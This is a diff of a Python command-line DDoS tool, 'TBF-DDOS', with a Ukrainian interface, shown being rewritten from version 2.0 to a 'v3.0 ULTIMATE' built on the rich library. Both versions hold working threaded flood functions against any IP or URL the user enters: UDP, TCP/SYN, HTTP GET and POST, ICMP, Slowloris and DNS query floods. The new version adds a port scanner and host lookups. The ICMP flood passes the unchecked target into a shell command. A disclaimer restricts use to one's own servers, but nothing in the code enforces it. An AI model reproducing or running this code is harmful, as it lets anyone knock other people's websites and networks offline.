@@ -1,319 +1,324 @@
-#!/usr/bin/env python3
-# ============================================
-#   TBF-DDOS v2.0
-#   by TBFPUMBA — Technology. Security. Efficiency.
-# ============================================
-
-import socket
-import random
-import threading
-import time
 import os
 import sys
-import struct
-import logging
+import time
+import socket
+import threading
+import requests
+from rich.console import Console
+from rich.panel import Panel
+from rich.table import Table
+from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
+from rich.prompt import Prompt, IntPrompt
 
-# Кольори
-RED = "\033[91m"
-GREEN = "\033[92m"
-YELLOW = "\033[93m"
-BLUE = "\033[94m"
-PURPLE = "\033[95m"
-CYAN = "\033[96m"
-WHITE = "\033[97m"
-RESET = "\033[0m"
-BOLD = "\033[1m"
+console = Console()
 
-# Налаштування логування
-logging.basicConfig(filename='tbf_ddos.log', level=logging.INFO, 
-                    format='%(asctime)s - %(message)s')
+def clear_screen():
+    os.system("clear" if os.name != "nt" else "cls")
 
-# Глобальна змінна для мови
-LANG = "ua"  # "ua" або "en"
+def show_banner():
+    clear_screen()
+    banner = """
+ [bold cyan]████████╗██████╗ ██████╗     ██████╗ ██████╗  ██████╗ ███████╗[/bold cyan]
+ [bold cyan]╚══██╔══╝██╔══██╗██╔══.     ██╔══██╗██╔══██╗██╔═══██╗██╔════╝[/bold cyan]
+ [bold blue]   ██║   ██████╔╝██████.     ██║  ██║██║  ██║██║   ██║███████╗[/bold blue]
+ [bold blue]   ██║   ██╔══██╗██╔═══╝     ██║  ██║██║  ██║██║   ██║╚════██║[/bold blue]
+ [bold magenta]   ██║   ██████╔╝██║         ██████╔╝██████╔╝╚██████╔╝███████║[/bold magenta]
+ [bold magenta]   ╚═╝   ╚═════╝ ╚═╝         ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝[/bold magenta]
+    """
+    console.print(Panel(banner, title="[bold red]v3.0 ULTIMATE | Stress & Penetration Test Suite[/bold red]", subtitle="[bold white]TBF Brand / TBFPUMBA Ecosystem[/bold white]", border_style="bold red"))
 
-def clear():
-    os.system('clear')
+def system_initialization():
+    clear_screen()
+    console.print("[bold cyan]=== INITIALIZING TBF STRESS ENGINE v3.0 ===[/bold cyan]\n")
 
-def set_language():
-    global LANG
-    clear()
-    print(f"{CYAN}╔══════════════════════════════════════════════════════════════════╗{RESET}")
-    print(f"{CYAN}║{RESET} {BOLD}{YELLOW}🌍 Виберіть мову / Select language{RESET}                          {CYAN}║{RESET}")
-    print(f"{CYAN}╠══════════════════════════════════════════════════════════════════╣{RESET}")
-    print(f"{CYAN}║{RESET}  {GREEN}1.{RESET} 🇺🇦 Українська                                      {CYAN}║{RESET}")
-    print(f"{CYAN}║{RESET}  {GREEN}2.{RESET} 🇬🇧 English                                         {CYAN}║{RESET}")
-    print(f"{CYAN}╚══════════════════════════════════════════════════════════════════╝{RESET}")
-    print()
-    choice = input("👉 Виберіть / Choose (1-2): ")
-    if choice == "2":
-        LANG = "en"
+    steps = [
+        ("Аналіз системних ресурсів та пам'яті...", "bold green"),
+        ("Перевірка мережевих інтерфейсів та сокетів...", "bold yellow"),
+        ("Синхронізація з потоками TBF Core Engine...", "bold magenta")
+    ]
+
+    with Progress(
+        SpinnerColumn(),
+        TextColumn("[progress.description]{task.description}"),
+        BarColumn(),
+        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
+        console=console
+    ) as progress:
+        for desc, color in steps:
+            task = progress.add_task(f"[{color}]{desc}", total=100)
+            for _ in range(50):
+                time.sleep(0.1)
+                progress.advance(task, 2)
+
+    time.sleep(0.5)
+
+def show_disclaimer():
+    clear_screen()
+    
+    author_info = "[bold white]Автор інструмента:[/bold white] [bold cyan]TBF Brand / cocofembo-glitch[/bold cyan]"
+    
+    disclaimer_text = (
+        "[bold red]УВАГА & ДИСКЛЕЙМЕР![/bold red]\n\n"
+        "Цей інструмент створено [bold yellow]ВИКЛЮЧНО для навчальних цілей[/bold yellow] "
+        "та тестування стійкості власних серверів/мереж (Stress Testing).\n\n"
+        "Розробник [bold red]НЕ НЕСЕ ЖОДНОЇ ВІДПОВІДАЛЬНОСТІ[/bold red] за будь-які неправомірні дії, "
+        "збитки або порушення закону, вчинені за допомогою цього софту.\n"
+        "Ви використовуєте цей інструмент повністю на власний ризик!"
+    )
+
+    console.print(Panel(author_info, border_style="cyan"))
+    time.sleep(0.8)
+    
+    console.print(Panel(disclaimer_text, title="[bold red]LEGAL NOTICE[/bold red]", border_style="red"))
+    
+    console.print("\n[bold green]Натисніть Enter, щоб підтвердити згоду та перейти в меню...[/bold green]")
+    input()
+
+def render_menu_table():
+    table = Table(title="[bold yellow]ГОЛОВНЕ МЕНЮ TBF-DDOS v3.0 ULTIMATE[/bold yellow]", expand=True, border_style="cyan")
+    table.add_column("№", style="bold red", justify="center", width=4)
+    table.add_column("Режим / Інструмент", style="bold white", width=26)
+    table.add_column("Опис та категорія", style="dim cyan")
+
+    table.add_row("1", "UDP Flood", "Масовий спам UDP-пакетами (L4 Layer)")
+    table.add_row("2", "TCP SYN Flood", "Шторм TCP SYN запитів для перезавантаження портів")
+    table.add_row("3", "HTTP GET Flood", "Атака запитами GET на веб-сервери (L7 Layer)")
+    table.add_row("4", "HTTP POST Flood", "Атака важкими POST-даними на веб-форми")
+    table.add_row("5", "ICMP Ping Flood", "Шторм Ping-пакетів для перевірки каналу")
+    table.add_row("6", "DNS Amplification Test", "Перевірка стійкості до відбитих DNS-атак")
+    table.add_row("7", "Port Scanner & Target Recon", "Швидкий сканер відкритих портів цілі")
+    table.add_row("8", "Website Status / Ping Check", "Моніторинг доступності та затримки (Ping/HTTP)")
+    table.add_row("9", "IP Resolver / Host Info", "Отримання IP, провайдера та хоста цілі")
+    table.add_row("10", "System Info & Network Diagnostics", "Діагностика Termux, RAM та IP пристрою")
+    table.add_row("0", "Вихід", "Завершити роботу інструмента")
+
+    console.print(table)
+
+def select_threads_preset():
+    console.print("\n[bold yellow]Виберіть режим навантаження (кількість потоків):[/bold yellow]")
+    console.print("[bold red]--- Потужний режим (для ПК / потужних смартфонів) ---[/bold red]")
+    console.print("[1] 100 потоків (Максимальний пресинг)")
+    console.print("[2] 50 потоків  (Стандартний потужний)")
+    console.print("[3] 30 потоків  (Помірне навантаження)")
+    console.print("[bold green]--- Лайт режим (для слабких телефонів / Termux) ---[/bold green]")
+    console.print("[4] 20 потоків  (Легкий тест)")
+    console.print("[5] 10 потоків  (Мінімальний)")
+    console.print("[6] 5 потоків   (Ультра-слабкі пристрої)")
+    console.print("[7] Ввести власне значення вручну\n")
+
+    choice = Prompt.ask("Ваш вибір потоків", choices=["1", "2", "3", "4", "5", "6", "7"], default="2")
+
+    presets = {"1": 100, "2": 50, "3": 30, "4": 20, "5": 10, "6": 5}
+    if choice in presets:
+        return presets[choice]
     else:
-        LANG = "ua"
+        return IntPrompt.ask("Введіть точну кількість потоків", default=15)
 
-def t(text):
-    """Переклад тексту залежно від мови"""
-    translations = {
-        "ua": {
-            "banner_title": "TBF-DDOS v2.0 — 5 типів атак",
-            "banner_warning": "⚠️ ТІЛЬКИ ДЛЯ ТЕСТУВАННЯ ВЛАСНИХ СИСТЕМ! ⚠️",
-            "menu_title": "📂 Виберіть тип атаки:",
-            "menu_1": "📡 UDP Flood",
-            "menu_2": "🔄 TCP SYN Flood",
-            "menu_3": "🌐 HTTP Flood",
-            "menu_4": "📦 ICMP Flood (Ping of Death)",
-            "menu_5": "🐌 Slowloris (повільна атака)",
-            "menu_6": "❌ Вихід",
-            "menu_choice": "👉 Виберіть (1-6): ",
-            "enter_ip": "📝 Введіть IP-адресу цілі: ",
-            "enter_port": "📝 Введіть порт (наприклад, 80): ",
-            "enter_duration": "📝 Введіть тривалість (секунди): ",
-            "enter_threads": "📝 Введіть кількість потоків (наприклад, 50): ",
-            "start_udp": "🔓 Запуск UDP-флуду на {}:{}",
-            "start_syn": "🔓 Запуск SYN-флуду на {}:{}",
-            "start_http": "🔓 Запуск HTTP-флуду на {}:{}",
-            "start_icmp": "🔓 Запуск ICMP-флуду (Ping of Death) на {}",
-            "start_slowloris": "🔓 Запуск Slowloris на {}:{}",
-            "duration": "⏳ Тривалість: {}с | 🧵 Потоки: {}",
-            "done": "✅ Атаку завершено!",
-            "icmp_error": "❌ ICMP-атака потребує root-прав! Запустіть з sudo або як root.",
-            "exit": "👋 Дякуємо, що використовуєте TBF-DDOS!",
-            "invalid": "❌ Невірний вибір.",
-            "press_enter": "Натисніть Enter..."
-        },
-        "en": {
-            "banner_title": "🔥 TBF-DDOS v2.0 — 5 attack types",
-            "banner_warning": "⚠️ FOR TESTING YOUR OWN SYSTEMS ONLY! ⚠️",
-            "menu_title": "📂 Select attack type:",
-            "menu_1": "📡 UDP Flood",
-            "menu_2": "🔄 TCP SYN Flood",
-            "menu_3": "🌐 HTTP Flood",
-            "menu_4": "📦 ICMP Flood (Ping of Death)",
-            "menu_5": "🐌 Slowloris (slow attack)",
-            "menu_6": "❌ Exit",
-            "menu_choice": "👉 Choose (1-6): ",
-            "enter_ip": "📝 Enter target IP address: ",
-            "enter_port": "📝 Enter port (e.g. 80): ",
-            "enter_duration": "📝 Enter duration (seconds): ",
-            "enter_threads": "📝 Enter number of threads (e.g. 50): ",
-            "start_udp": "🔓 Starting UDP flood on {}:{}",
-            "start_syn": "🔓 Starting SYN flood on {}:{}",
-            "start_http": "🔓 Starting HTTP flood on {}:{}",
-            "start_icmp": "🔓 Starting ICMP flood (Ping of Death) on {}",
-            "start_slowloris": "🔓 Starting Slowloris on {}:{}",
-            "duration": "⏳ Duration: {}s | 🧵 Threads: {}",
-            "done": "✅ Attack completed!",
-            "icmp_error": "❌ ICMP attack requires root privileges! Run with sudo or as root.",
-            "exit": "👋 Thank you for using TBF-DDOS!",
-            "invalid": "❌ Invalid choice.",
-            "press_enter": "Press Enter..."
-        }
-    }
-    return translations[LANG].get(text, text)
+# Глобальний прапор зупинки
+is_running = True
 
-def banner():
-    print(f"""{RED}{BOLD}
-╔══════════════════════════════════════════════════════════════════╗
-║                                                                  ║
-║   ████████╗██████╗ ███████╗    ███╗   ██╗ ██████╗ ████████╗███████╗
-║   ╚══██╔══╝██╔══██╗██╔════╝    ████╗  ██║██╔═══██╗╚══██╔══╝██╔════╝
-║      ██║   ██████╔╝█████╗      ██╔██╗ ██║██║   ██║   ██║   █████╗  
-║      ██║   ██╔══██╗██╔══╝      ██║╚██╗██║██║   ██║   ██║   ██╔══╝  
-║      ██║   ██████╔╝██║         ██║ ╚████║╚██████╔╝   ██║   ███████╗
-║      ╚═╝   ╚═════╝ ╚═╝         ╚═╝  ╚═══╝ ╚═════╝    ╚═╝   ╚══════╝
-║                                                                  ║
-║        ██████╗ ██████╗  ██████╗     ███████╗██╗  ██╗            ║
-║        ██╔══██╗██╔══██╗██╔═══██╗    ██╔════╝██║  ██║            ║
-║        ██████╔╝██████╔╝██║   ██║    ███████╗███████║            ║
-║        ██╔═══╝ ██╔══██╗██║   ██║    ╚════██║██╔══██║            ║
-║        ██║     ██║  ██║╚██████╔╝    ███████║██║  ██║            ║
-║        ╚═╝     ╚═╝  ╚═╝ ╚═════╝     ╚══════╝╚═╝  ╚═╝            ║
-║                                                                  ║
-║                ██╗  ██╗██████╗ ██████╗  ██████╗                 ║
-║                ██║  ██║██╔══██╗██╔══██╗██╔═══██╗                ║
-║                ███████║██████╔╝██████╔╝██║   ██║                ║
-║                ██╔══██║██╔═══╝ ██╔══██╗██║   ██║                ║
-║                ██║  ██║██║     ██║  ██║╚██████╔╝                ║
-║                ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝                 ║
-║                                                                  ║
-║                     TBFPUMBA — TECHNOLOGY. SECURITY. EFFICIENCY  ║
-║                                                                  ║
-╚══════════════════════════════════════════════════════════════════╝{RESET}
-    """)
-    print(f"{CYAN}╔══════════════════════════════════════════════════════════════════╗{RESET}")
-    print(f"{CYAN}║{RESET} {BOLD}{PURPLE}{t('banner_title')}{RESET}                              {CYAN}║{RESET}")
-    print(f"{CYAN}║{RESET} {BOLD}{YELLOW}{t('banner_warning')}{RESET}                    {CYAN}║{RESET}")
-    print(f"{CYAN}╚══════════════════════════════════════════════════════════════════╝{RESET}")
-    print()
-
-def log_attack(target_ip, target_port, attack_type, duration, threads):
-    logging.info(f"Атака: {attack_type} | IP: {target_ip} | Порт: {target_port} | Тривалість: {duration}с | Потоки: {threads}")
-
-def udp_flood(target_ip, target_port, duration, threads):
-    def flood():
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        while True:
-            try:
-                data = random._urandom(1024)
-                sock.sendto(data, (target_ip, target_port))
-            except:
-                pass
-    
-    log_attack(target_ip, target_port, "UDP Flood", duration, threads)
-    print(f"{GREEN}{t('start_udp').format(target_ip, target_port)}{RESET}")
-    print(f"{YELLOW}{t('duration').format(duration, threads)}{RESET}")
-    print("=" * 60)
-    
-    for _ in range(threads):
-        threading.Thread(target=flood, daemon=True).start()
-    
-    time.sleep(duration)
-    print(f"{GREEN}{t('done')}{RESET}")
-
-def syn_flood(target_ip, target_port, duration, threads):
-    def flood():
-        while True:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.1)
-                sock.connect((target_ip, target_port))
-                sock.close()
-            except:
-                pass
-    
-    log_attack(target_ip, target_port, "SYN Flood", duration, threads)
-    print(f"{GREEN}{t('start_syn').format(target_ip, target_port)}{RESET}")
-    print(f"{YELLOW}{t('duration').format(duration, threads)}{RESET}")
-    print("=" * 60)
-    
-    for _ in range(threads):
-        threading.Thread(target=flood, daemon=True).start()
-    
-    time.sleep(duration)
-    print(f"{GREEN}{t('done')}{RESET}")
-
-def http_flood(target_ip, target_port, duration, threads):
-    def flood():
-        while True:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.1)
-                sock.connect((target_ip, target_port))
-                sock.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
-                sock.close()
-            except:
-                pass
-    
-    log_attack(target_ip, target_port, "HTTP Flood", duration, threads)
-    print(f"{GREEN}{t('start_http').format(target_ip, target_port)}{RESET}")
-    print(f"{YELLOW}{t('duration').format(duration, threads)}{RESET}")
-    print("=" * 60)
-    
-    for _ in range(threads):
-        threading.Thread(target=flood, daemon=True).start()
-    
-    time.sleep(duration)
-    print(f"{GREEN}{t('done')}{RESET}")
-
-def icmp_flood(target_ip, duration, threads):
-    if os.geteuid() != 0:
-        print(f"{RED}{t('icmp_error')}{RESET}")
-        return
-    
-    def flood():
-        while True:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-                packet = struct.pack('!BBHHH', 8, 0, 0, 0, 1) + random._urandom(56)
-                sock.sendto(packet, (target_ip, 0))
-            except:
-                pass
-    
-    log_attack(target_ip, 0, "ICMP Flood", duration, threads)
-    print(f"{GREEN}{t('start_icmp').format(target_ip)}{RESET}")
-    print(f"{YELLOW}{t('duration').format(duration, threads)}{RESET}")
-    print("=" * 60)
-    
-    for _ in range(threads):
-        threading.Thread(target=flood, daemon=True).start()
-    
-    time.sleep(duration)
-    print(f"{GREEN}{t('done')}{RESET}")
-
-def slowloris(target_ip, target_port, duration, threads):
-    def flood():
+def udp_flood(target_ip, target_port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes_payload = os.urandom(1024)
+    while is_running:
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(5)
-            sock.connect((target_ip, target_port))
-            sock.send(b"GET / HTTP/1.1\r\n")
-            while True:
-                try:
-                    sock.send(b"X-Header: keep-alive\r\n")
-                    time.sleep(10)
-                except:
-                    break
+            sock.sendto(bytes_payload, (target_ip, target_port))
         except:
             pass
-    
-    log_attack(target_ip, target_port, "Slowloris", duration, threads)
-    print(f"{GREEN}{t('start_slowloris').format(target_ip, target_port)}{RESET}")
-    print(f"{YELLOW}{t('duration').format(duration, threads)}{RESET}")
-    print("=" * 60)
-    
-    for _ in range(threads):
-        threading.Thread(target=flood, daemon=True).start()
-    
-    time.sleep(duration)
-    print(f"{GREEN}{t('done')}{RESET}")
 
-def show_menu():
-    clear()
-    banner()
-    print(f"{GREEN}{t('menu_title')}{RESET}")
-    print(f"  {YELLOW}1.{RESET} {t('menu_1')}")
-    print(f"  {YELLOW}2.{RESET} {t('menu_2')}")
-    print(f"  {YELLOW}3.{RESET} {t('menu_3')}")
-    print(f"  {YELLOW}4.{RESET} {t('menu_4')}")
-    print(f"  {YELLOW}5.{RESET} {t('menu_5')}")
-    print(f"  {YELLOW}6.{RESET} {t('menu_6')}")
-    print()
-    return input(f"{t('menu_choice')}")
+def tcp_flood(target_ip, target_port):
+    while is_running:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1)
+            sock.connect((target_ip, target_port))
+            sock.send(os.urandom(64))
+            sock.close()
+        except:
+            pass
+
+def http_get_flood(target_url):
+    while is_running:
+        try:
+            requests.get(target_url, timeout=2)
+        except:
+            pass
+
+def http_post_flood(target_url):
+    data = {"test": "TBF_STRESS_TEST_" * 50}
+    while is_running:
+        try:
+            requests.post(target_url, data=data, timeout=2)
+        except:
+            pass
+
+def icmp_ping_flood(target_ip):
+    while is_running:
+        try:
+            os.system(f"ping -c 1 -w 1 {target_ip} > /dev/null 2>&1")
+        except:
+            pass
+
+def dns_amp_test(target_ip):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    payload = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x25\x00\x01'
+    while is_running:
+        try:
+            sock.sendto(payload, (target_ip, 53))
+        except:
+            pass
+
+def run_stress_engine(target_desc, attack_func, args, threads_count, duration):
+    global is_running
+    is_running = True
+    threads = []
+
+    console.print(f"\n[bold green][+] Запуск {target_desc} ({threads_count} потоків)...[/bold green]")
+
+    for _ in range(threads_count):
+        t = threading.Thread(target=attack_func, args=args)
+        t.daemon = True
+        t.start()
+        threads.append(t)
+
+    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}")) as progress:
+        task = progress.add_task("[bold red]Виконується стрес-тест...", total=duration)
+        for _ in range(duration):
+            if not progress.finished:
+                time.sleep(1)
+                progress.advance(task, 1)
+
+    is_running = False
+    console.print("\n[bold yellow][!] Тест завершено! Зупинка потоків...[/bold yellow]")
+    time.sleep(1)
+    console.print("[bold green][✓] Готово![/bold green]\n")
+
+def port_scanner():
+    target = Prompt.ask("Введіть IP або хост для сканування")
+    console.print(f"[bold cyan]Сканування популярних портів на {target}...[/bold cyan]")
+    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 8080]
+    table = Table(title=f"Результати сканування: {target}", border_style="yellow")
+    table.add_column("Порт", style="bold white")
+    table.add_column("Статус", style="bold green")
+
+    for port in common_ports:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(0.5)
+        result = sock.connect_ex((target, port))
+        if result == 0:
+            table.add_row(str(port), "[bold green]ВІДКРИТИЙ[/bold green]")
+        else:
+            table.add_row(str(port), "[bold red]ЗАКРИТИЙ[/bold red]")
+        sock.close()
+    console.print(table)
+
+def status_checker():
+    target = Prompt.ask("Введіть URL для перевірки (наприклад, https://google.com)")
+    try:
+        start_time = time.time()
+        res = requests.get(target, timeout=5)
+        latency = round((time.time() - start_time) * 1000, 2)
+        console.print(Panel(
+            f"[bold white]URL:[/bold white] {target}\n"
+            f"[bold white]Status Code:[/bold white] [bold green]{res.status_code}[/bold green]\n"
+            f"[bold white]Ping / Latency:[/bold white] [bold yellow]{latency} ms[/bold yellow]",
+            title="[bold green]Website Status OK[/bold green]", border_style="green"
+        ))
+    except Exception as e:
+        console.print(Panel(f"[bold red]Помилка з'єднання:[/bold red] {e}", title="[bold red]Target Down / Unreachable[/bold red]", border_style="red"))
+
+def ip_resolver():
+    host = Prompt.ask("Введіть домен або хост (наприклад, example.com)")
+    try:
+        ip = socket.gethostbyname(host)
+        console.print(Panel(f"[bold white]Хост:[/bold white] {host}\n[bold white]IP Адреса:[/bold white] [bold cyan]{ip}[/bold cyan]", title="[bold cyan]IP Resolved[/bold cyan]", border_style="cyan"))
+    except Exception as e:
+        console.print(f"[bold red]Не вдалося отримати IP: {e}[/bold red]")
+
+def system_info():
+    table = Table(title="Діагностика системи та мережі", border_style="magenta")
+    table.add_column("Параметр", style="bold white")
+    table.add_column("Значення", style="bold cyan")
+
+    table.add_row("ОС Platform", sys.platform)
+    table.add_row("Python Version", sys.version.split()[0])
+    try:
+        local_ip = socket.gethostbyname(socket.gethostname())
+    except:
+        local_ip = "127.0.0.1"
+    table.add_row("Локальний IP", local_ip)
+    console.print(table)
 
 def main():
-    set_language()
+    system_initialization()
+    show_disclaimer()
+
     while True:
-        choice = show_menu()
-        if choice in ["1", "2", "3", "4", "5"]:
-            target_ip = input(f"{GREEN}{t('enter_ip')}{RESET}")
-            target_port = 0
-            if choice != "4":
-                target_port = int(input(f"{GREEN}{t('enter_port')}{RESET}"))
-            duration = int(input(f"{GREEN}{t('enter_duration')}{RESET}"))
-            threads = int(input(f"{GREEN}{t('enter_threads')}{RESET}"))
-            
-            clear()
-            banner()
-            
-            if choice == "1":
-                udp_flood(target_ip, target_port, duration, threads)
-            elif choice == "2":
-                syn_flood(target_ip, target_port, duration, threads)
-            elif choice == "3":
-                http_flood(target_ip, target_port, duration, threads)
-            elif choice == "4":
-                icmp_flood(target_ip, duration, threads)
-            elif choice == "5":
-                slowloris(target_ip, target_port, duration, threads)
-            
-            input(f"\n{t('press_enter')}")
+        show_banner()
+        render_menu_table()
+
+        choice = Prompt.ask("\nОберіть номер функції", choices=[str(i) for i in range(11)], default="1")
+
+        if choice == "0":
+            console.print("[bold red]Завершення роботи TBF-DDOS... До зустрічі![/bold red]")
+            break
+
+        elif choice == "1":
+            ip = Prompt.ask("Введіть Цільовий IP")
+            port = IntPrompt.ask("Введіть Порт", default=80)
+            threads = select_threads_preset()
+            dur = IntPrompt.ask("Тривалість (сек)", default=15)
+            run_stress_engine(f"UDP Flood на {ip}:{port}", udp_flood, (ip, port), threads, dur)
+
+        elif choice == "2":
+            ip = Prompt.ask("Введіть Цільовий IP")
+            port = IntPrompt.ask("Введіть Порт", default=80)
+            threads = select_threads_preset()
+            dur = IntPrompt.ask("Тривалість (сек)", default=15)
+            run_stress_engine(f"TCP SYN Flood на {ip}:{port}", tcp_flood, (ip, port), threads, dur)
+
+        elif choice == "3":
+            url = Prompt.ask("Введіть Цільовий URL (наприклад, http://example.com)")
+            threads = select_threads_preset()
+            dur = IntPrompt.ask("Тривалість (сек)", default=15)
+            run_stress_engine(f"HTTP GET Flood на {url}", http_get_flood, (url,), threads, dur)
+
+        elif choice == "4":
+            url = Prompt.ask("Введіть Цільовий URL")
+            threads = select_threads_preset()
+            dur = IntPrompt.ask("Тривалість (сек)", default=15)
+            run_stress_engine(f"HTTP POST Flood на {url}", http_post_flood, (url,), threads, dur)
+
+        elif choice == "5":
+            ip = Prompt.ask("Введіть Цільовий IP")
+            threads = select_threads_preset()
+            dur = IntPrompt.ask("Тривалість (сек)", default=15)
+            run_stress_engine(f"ICMP Ping Flood на {ip}", icmp_ping_flood, (ip,), threads, dur)
+
         elif choice == "6":
-            clear()
-            banner()
-            print(f"{GREEN}{t('exit')}{RESET}")
-            sys.exit(0)
-        else:
-            print(f"{RED}{t('invalid')}{RESET}")
-            time.sleep(1)
+            ip = Prompt.ask("Введіть Цільовий DNS IP")
+            threads = select_threads_preset()
+            dur = IntPrompt.ask("Тривалість (сек)", default=15)
+            run_stress_engine(f"DNS Amplification Test на {ip}", dns_amp_test, (ip,), threads, dur)
+
+        elif choice == "7":
+            port_scanner()
+
+        elif choice == "8":
+            status_checker()
+
+        elif choice == "9":
+            ip_resolver()
+
+        elif choice == "10":
+            system_info()
+
+        console.print("\n[bold green]Натисніть Enter, щоб повернутися в головне меню...[/bold green]")
+        input()
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        console.print("\n[bold red][!] Роботу перервано користувачем.[/bold red]")
+  
